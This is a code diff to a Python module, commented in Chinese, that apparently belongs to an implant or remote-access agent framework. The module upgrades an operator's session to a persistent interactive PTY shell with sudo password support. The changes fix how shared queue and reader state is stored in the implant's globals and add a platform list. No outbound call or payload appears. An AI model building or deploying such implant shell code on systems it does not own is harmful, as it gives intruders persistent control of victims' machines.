@@ -38,15 +38,21 @@ import time as _tm
 
 MODULE = {
     "desc": "升级为交互式 shell（PTY 持久子进程，命令状态保留，支持 sudo 密码交互）",
+    "platforms": ["linux", "mac"],
     "params": [],
 }
 
 _END_MARK = "__PYEXEC_END_"
 
 # ── PTY 会话状态 ──
-_LINES_Q = _q.Queue()     # (seq, line)
-_READER_SH = None         # 当前 reader 绑定的子进程
-_READER_SEQ = 0           # 单调递增序号
+# 任务代码跑在专用命名空间里, 模块级变量只对本任务可见; 而 globals() 在任务
+# 里指向植入物全局(_glb_API), 所以**跨函数共享的状态一律走 globals()["X"]
+# 字符串键通道**(与 _SH/_SH_PENDING 等一致), 不能建模块级变量——否则
+# `_LINES_Q` 会出现"reader 写 A 队列、drain 读 B 队列"的分叉(2026-09-28)。
+_G0 = globals()
+_G0.setdefault("_LINES_Q", _q.Queue())    # (seq, line)
+_G0.setdefault("_READER_SH", None)        # 当前 reader 绑定的子进程
+_G0.setdefault("_READER_SEQ", 0)          # 单调递增序号
 
 
 def _start_shell():
@@ -58,7 +64,7 @@ def _start_shell():
     if _os.name == "nt":
         G["_SHELL_WIN"] = True
         return _sp.Popen(["cmd.exe"], stdin=_sp.PIPE, stdout=_sp.PIPE,
-                         stderr=_sp.STDOUT, text=True, bufsize=1)
+                         stderr=_sp.STDOUT, universal_newlines=True, bufsize=1)
     G["_SHELL_WIN"] = False
     import pty
     m, s = pty.openpty()
@@ -193,9 +199,10 @@ def _ensure_reader(sh):
 
 def _drain_lines():
     """把队列里的行路由到任务输出（reader 与任务循环之间）。"""
+    G = globals()
     while True:
         try:
-            _seq, line = _LINES_Q.get_nowait()
+            _seq, line = G["_LINES_Q"].get_nowait()
         except _q.Empty:
             return
         if line is None:
